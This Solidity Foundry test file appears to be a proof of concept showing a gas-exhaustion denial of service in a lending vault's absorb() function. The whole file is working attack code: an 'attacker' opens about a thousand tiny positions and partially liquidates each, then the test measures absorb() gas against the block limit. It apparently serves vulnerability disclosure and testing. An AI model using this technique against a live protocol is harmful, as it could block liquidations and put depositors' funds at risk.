// SPDX-License-Identifier: MIT
pragma solidity 0.8.21;

import "../vaultT1/vault/vault.t.sol";
import { TickMath } from "../../../contracts/libraries/tickMath.sol";

contract BranchChainAbsorbDosTest is VaultT1BaseTest {
    uint256 internal constant X19 = 0x7ffff;
    uint256 internal constant X20 = 0xfffff;
    uint256 internal constant X30 = 0x3fffffff;
    uint256 internal constant COLLATERAL_PER_BRANCH = 10_000; // $0.01 USDC
    uint256 internal constant INITIAL_DEBT = 7_990_000_000_000_000; // 0.00799 DAI
    uint256 internal constant PARTIAL_LIQUIDATION_AMOUNT = 1_000_000_000_000;
    uint256 internal constant HEALTHY_PRICE = 1e39;
    uint256 internal constant PARTIAL_LIQUIDATION_PRICE = (HEALTHY_PRICE * 98) / 100;
    uint256 internal constant ABSORB_PRICE = (HEALTHY_PRICE * 80) / 100;
    bytes4 internal constant ABSORB_SELECTOR = bytes4(keccak256("absorb()"));

    uint256 internal blockGasCap;
    uint256 internal wideGasCap;
    uint256 internal totalBorrowed;
    uint256 internal previousWideGas;
    int256 internal firstBranchTick;
    int256 internal lastBranchTick;

    struct GasResult {
        uint256 gasUsed;
        bool completed;
        uint256 returnDataLength;
    }

    function test_linkedBranchesCanExceedBlockGas() public {
        blockGasCap = vm.envOr("PLASMA_BLOCK_GAS_LIMIT", uint256(36_000_000));
        wideGasCap = blockGasCap * 8;
        if (wideGasCap < 300_000_000) wideGasCap = 300_000_000;

        deal(address(USDC), alice, 1_000_000 * 1e6);
        deal(address(DAI), bob, 1_000_000 * 1e18);
        _setApproval(USDC, address(vaultOne), alice);
        _setApproval(DAI, address(vaultOne), bob);

        for (uint256 i = 1; i <= 1024; ++i) {
            _appendAndLiquidateBranch(i);
            if (i >= 32 && (i & (i - 1)) == 0) _checkpoint(i);
        }
    }

    function _appendAndLiquidateBranch(uint256 expectedBranchId_) internal {
        uint256 rawBefore_ = _vaultVariables();
        uint256 debtAmount_ = expectedBranchId_ == 1
            ? INITIAL_DEBT
            : _minimumDebtForTick(_topTick(rawBefore_));

        oracleOne.setPrice(HEALTHY_PRICE);
        vm.prank(alice);
        vaultOne.operate(0, int256(COLLATERAL_PER_BRANCH), int256(debtAmount_), alice);
        totalBorrowed += debtAmount_;

        uint256 raw_ = _vaultVariables();
        assertEq(raw_ & 2, 0, "new branch must be active");
        assertEq(_totalBranches(raw_), expectedBranchId_, "new position must append one branch");

        int256 openedTick_ = _topTick(raw_);
        if (expectedBranchId_ == 1) firstBranchTick = openedTick_;
        lastBranchTick = openedTick_;

        oracleOne.setPrice(PARTIAL_LIQUIDATION_PRICE);
        vm.prank(bob);
        (uint256 actualDebt_, uint256 actualCol_) = vaultOne.liquidate(
            PARTIAL_LIQUIDATION_AMOUNT,
            0,
            bob,
            false
        );
        assertGt(actualDebt_, 0, "partial liquidation must consume debt");
        assertGt(actualCol_, 0, "partial liquidation must consume collateral");
        assertLt(actualDebt_, debtAmount_, "liquidation must stay partial");

        raw_ = _vaultVariables();
        assertEq(raw_ & 2, 2, "current branch must be liquidated");
        assertEq(_totalBranches(raw_), expectedBranchId_, "branch chain must persist");
    }

    function _checkpoint(uint256 branchCount_) internal {
        oracleOne.setPrice(ABSORB_PRICE);
        GasResult memory wide_ = _measureAbsorb(wideGasCap);
        GasResult memory capped_ = _measureAbsorb(blockGasCap);

        assertTrue(wide_.completed, "wide-cap absorb must complete");
        if (previousWideGas != 0) {
            assertTrue(wide_.gasUsed > previousWideGas, "absorb gas must grow with branches");
        }
        previousWideGas = wide_.gasUsed;

        emit log_named_uint("linked branches", branchCount_);
        emit log_named_int("first branch top tick", firstBranchTick);
        emit log_named_int("last branch top tick", lastBranchTick);
        emit log_named_uint("tick range width", _absoluteTickDistance(firstBranchTick, lastBranchTick));
        emit log_named_uint("attacker deposited USDC raw", branchCount_ * COLLATERAL_PER_BRANCH);
        emit log_named_uint("attacker nominal borrowed DAI wei", totalBorrowed);
        emit log_named_uint("wide-cap absorb gas", wide_.gasUsed);
        emit log_named_uint("live block gas cap", blockGasCap);
        emit log_named_uint("block-capped absorb completed", capped_.completed ? 1 : 0);
        emit log_named_uint("block-capped call gas", capped_.gasUsed);
        emit log_named_uint("block-capped return bytes", capped_.returnDataLength);

        oracleOne.setPrice(HEALTHY_PRICE);
    }

    function _minimumDebtForTick(int256 targetTick_) internal pure returns (uint256 debtAmount_) {
        uint256 ratio_ = TickMath.getRatioAtTick(targetTick_ - 1);
        debtAmount_ =
            ((ratio_ * COLLATERAL_PER_BRANCH) + TickMath.ZERO_TICK_SCALED_RATIO - 1) /
            TickMath.ZERO_TICK_SCALED_RATIO;
        debtAmount_ += 1000;
    }

    function _measureAbsorb(uint256 gasCap_) internal returns (GasResult memory result_) {
        uint256 snapshot_ = vm.snapshot();
        bytes memory returnData_;
        uint256 gasBefore_ = gasleft();
        (result_.completed, returnData_) = address(vaultOne).call{ gas: gasCap_ }(
            abi.encodeWithSelector(ABSORB_SELECTOR)
        );
        result_.gasUsed = gasBefore_ - gasleft();
        result_.returnDataLength = returnData_.length;
        assertTrue(vm.revertTo(snapshot_), "snapshot restore failed");
    }

    function _vaultVariables() internal view returns (uint256) {
        return vaultOne.readFromStorage(bytes32(uint256(0)));
    }

    function _totalBranches(uint256 raw_) internal pure returns (uint256) {
        return (raw_ >> 52) & X30;
    }

    function _topTick(uint256 raw_) internal pure returns (int256) {
        uint256 encoded_ = (raw_ >> 2) & X20;
        uint256 absolute_ = (encoded_ >> 1) & X19;
        return (encoded_ & 1) == 1 ? int256(absolute_) : -int256(absolute_);
    }

    function _absoluteTickDistance(int256 a_, int256 b_) internal pure returns (uint256) {
        int256 diff_ = a_ - b_;
        return uint256(diff_ < 0 ? -diff_ : diff_);
    }
}
